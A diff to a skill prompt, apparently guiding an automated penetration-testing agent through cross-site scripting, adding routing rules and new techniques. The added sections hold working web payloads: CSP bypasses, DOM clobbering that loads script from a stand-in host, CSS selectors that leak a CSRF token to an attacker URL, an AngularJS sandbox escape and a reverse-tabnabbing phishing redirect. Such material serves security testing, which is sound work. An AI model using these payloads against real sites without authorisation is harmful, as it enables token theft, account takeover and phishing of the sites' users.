@@ -1,7 +1,39 @@
 ---
 name: xss
 description: >-
-  Use xss when the objective is to demonstrate that user-supplied text reaches a browser-parsed rendering or scripting sink and runs as markup or JavaScript, and recon shows a surface where that is plausible — any HTML response (`Content-Type: text/html` or `image/svg+xml`) that displays content you control, such as a search box, filter, sort, pagination or tracking parameter, a path segment, or input echoed by error, "no results", or 404 pages; any persistence surface in a multi-user app where one user's text is later shown to another viewer (comments, forums, messaging, usernames and display names, profile bios, reviews, team or organization names, calendar titles, file names in a listing, support tickets, admin notes, log or audit viewers); a JavaScript-heavy single-page app whose server returns a near-empty shell and whose client reads `location.hash` / `location.search` / `document.referrer` / `postMessage` / storage; a recon fingerprint of React, Vue, Angular, or Svelte, or markup with `data-reactroot` / `ng-` / `v-` attributes and hydration JSON; an inline-served upload, rich-text or Markdown renderer, or a `Content-Security-Policy` header you want to assess for protectiveness; or a blind surface an operator or headless checker will view later. Covers context classification (HTML body, attribute, JS, URL, CSS, SVG, Markdown), filter and sanitizer bypass (event handlers, mutation XSS, polyglots), framework-specific sinks (React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `$sce`, Svelte `{@html}`), and CSP and Trusted Types bypass. Disambiguate from look-alikes that share a reflected value: a value the server evaluates as a template expression is SSTI not XSS; a value that bends a database query is SQL injection and one that reaches a shell or process is command injection; a user-controlled URL the server itself fetches is SSRF, while a URL the browser navigates to is in scope here; a redirect via a plain `Location` header is open redirect, becoming XSS only when the target is a scriptable scheme. Route here whenever user-influenced data plausibly reaches a parsing or scripting sink, not merely because a value is reflected.
+  Use: Use xss when the objective is to demonstrate that user-supplied text reaches a browser-parsed
+  rendering or scripting sink and runs as markup or JavaScript, and recon shows a surface where that
+  is plausible — any HTML response (`Content-Type: text/html` or `image/svg+xml`) that displays
+  content you control, such as a search box, filter, sort, pagination or tracking parameter, a path
+  segment, or input echoed by error, "no results", or 404 pages; any persistence surface in a
+  multi-user app where one user's text is later shown to another viewer (comments, forums,
+  messaging, usernames and display names, profile bios, reviews, team or organization names,
+  calendar titles, file names in a listing, support tickets, admin notes, log or audit viewers); a
+  JavaScript-heavy single-page app whose server returns a near-empty shell and whose client reads
+  `location.hash` / `location.search` / `document.referrer` / `postMessage` / storage; a recon
+  fingerprint of React, Vue, Angular, or Svelte, or markup with `data-reactroot` / `ng-` / `v-`
+  attributes and hydration JSON; an inline-served upload, rich-text or Markdown renderer, or an
+  already observed injection surface where a `Content-Security-Policy` header may affect
+  exploitability; or a blind surface an operator or headless checker will view later.
+  Signals: The use condition above is the routing signal; dispatch only when those facts are
+  present.
+  Pair with: Also dispatch csrf, open-redirect, insecure-file-uploads in parallel when the same
+  evidence shows those mechanisms too; co-dispatch means separate focused workers sharing the same
+  investigation state, not merging skill prompts.
+  Coverage: Covers context classification (HTML body, attribute, JS, URL, CSS, SVG, Markdown),
+  filter and sanitizer bypass (event handlers, mutation XSS, polyglots), framework-specific sinks
+  (React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `$sce`, Svelte `{@html}`), and CSP and
+  Trusted Types bypass. Disambiguate from look-alikes that share a reflected value: a value the
+  server evaluates as a template expression is SSTI not XSS; a value that bends a database query is
+  SQL injection and one that reaches a shell or process is command injection; a user-controlled URL
+  the server itself fetches is SSRF, while a URL the browser only navigates to is open redirect or
+  normal link handling unless it reaches a scriptable scheme, DOM sink, or other browser parsing
+  context; a redirect via a plain `Location` header is open redirect, becoming XSS only when the
+  target is scriptable. Route here whenever user-influenced data plausibly reaches a parsing or
+  scripting sink, not merely because a value is reflected.
+  Do not use: Do not dispatch when the described input surface is absent, when the value is only
+  stored or echoed without reaching this skill's mechanism, or when another specialist's sink
+  explains the evidence more directly.
 metadata:
   dispatchable: true
 ---
@@ -133,6 +165,16 @@ Handlebars helpers, lodash templates):
 - Defeat the modern strict pattern (`'nonce-…' 'strict-dynamic'`) by
   finding a parser-injection point that lets you write a `<script>` tag
   that inherits a leaked nonce, or by abusing a same-origin script gadget.
+- `script-src 'self'` (no `data:`): load via `<object>` —
+  `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>`.
+- `script-src 'self' data:`: a `data:` script source runs —
+  `<script src="data:,alert(1)">`.
+- Nonce + a relative-src `<script src='/x.js'>`: inject `<base
+  href=//SRV>` so the relative source resolves to your host (the nonce no
+  longer protects it).
+- CSP set by PHP `header()`: force "headers already sent" so the policy is
+  never emitted — flood ~1000 `&a` query params to trip
+  `max_input_vars`, e.g. `?xss=<script>alert(1)</script>&a&a&a…[×1000]`.
 
 ### Trusted Types bypass
 - Custom policies returning unsanitized strings — abuse the policy
@@ -152,6 +194,34 @@ prototypes and turn future DOM writes into script execution:
 ```
 Test wherever `Object.assign`, lodash `merge`, or hand-rolled deep-merge
 utilities consume user JSON.
+
+### DOM clobbering → XSS (when script injection is filtered)
+When you have HTML injection but `<script>`/event handlers are stripped or CSP
+blocks inline, name an injected element so its `id`/`name` shadows a global the
+page trusts. No JS runs from your markup — you supply a controllable value the
+page's own code then renders or loads:
+```html
+<a id=x><a id=x name=y href="//SRV/evil.js">   <!-- x.y === the href string -->
+<script src=defaultData></script>              <!-- + <a id=defaultData href=//SRV/x.js> retargets it -->
+<html id=cdnDomain>clobbered</html>            <!-- clobbers document.getElementById('cdnDomain') -->
+```
+Use when the page does `if(window.X)` / `config.url` / `el.innerHTML=settings.tpl`
+against named DOM nodes. Multi-level clobbering, browser-specific `<base>`
+tricks, and the DOMPurify `cid:` trick are in `references/dom-clobbering.md`.
+
+### CSS injection → data exfil (when JS is blocked but CSS is allowed)
+If you can inject CSS (a `<style>` block, `style=` attribute, or controllable
+stylesheet) but not JavaScript — common when CSP allows `style-src` but blocks
+`script-src` — leak a secret on the page with CSS alone. Attribute selectors
+brute-force an input value one char at a time; a match fetches a URL you watch:
+```css
+input[name="csrf"][value^="a"]{background:url(https://SRV/?c=a)}
+```
+`@import` enables blind exfil, `@font-face unicode-range` is a char-presence
+oracle, and cross-origin `attr()`+`image-set()` leaks a value in one shot. Full
+methodology (sibling/`:has()` selectors, Sequential Import Chaining, ligature
+text-node leaks) in `references/css-injection.md`. This needs NO script
+execution — reach for it whenever the only sink is style.
 
 ### WAF bypass payload library
 Concrete payloads observed against major WAFs (rotate when one is
@@ -194,8 +264,12 @@ Parentheses-stripping bypass: ``alert`1` `` (tagged template).
   event handlers or URLs from untrusted input.
 - **Vue** — `v-html` and dynamic attribute bindings; SSR hydration
   mismatches can re-interpret content.
-- **Angular** — legacy expression injection (pre-1.6); `$sce` trust APIs
-  misused to whitelist attacker content.
+- **Angular** — legacy AngularJS expression injection / client-side template
+  injection: confirm with `{{7*7}}`→`49`, then escape the sandbox (removed in
+  1.6, so 1.6+ runs `{{constructor.constructor('alert(1)')()}}` directly).
+  Version-specific escapes and quote-less variants in
+  `references/angularjs-csti.md`. Modern Angular 2+ sink is user input passed to
+  `bypassSecurityTrust*`; `$sce` trust APIs misused to whitelist user content.
 - **Svelte** — `{@html}` and dynamic attributes.
 - **Markdown / richtext** — many renderers allow HTML passthrough; plugins
   may re-enable raw HTML. Sanitize post-render; forbid inline HTML or
@@ -225,6 +299,14 @@ Parentheses-stripping bypass: ``alert`1` `` (tagged template).
 - **Speculation Rules API** (Chrome 121+) — `<script
   type="speculationrules">` prefetches can fire request-time XSS sinks
   before the user navigates; test prefetch URLs as their own surface.
+- **Reverse tabnabbing** — when the app renders a user-controlled link that
+  opens in a new tab (`target="_blank"`) WITHOUT `rel="noopener"`, the linked
+  page keeps a handle to the original via `window.opener` and can rewrite it:
+  `window.opener.location="https://SRV/phish"`. The original tab silently
+  becomes a look-alike login page. Oracle: grep rendered links for
+  `target="_blank"` lacking `noopener`/`noreferrer` in `rel`. This is a
+  client-side redirect/phishing issue, not script execution — report it
+  alongside XSS findings when user-supplied links are reflected into anchors.
 
 ## Workflow
 
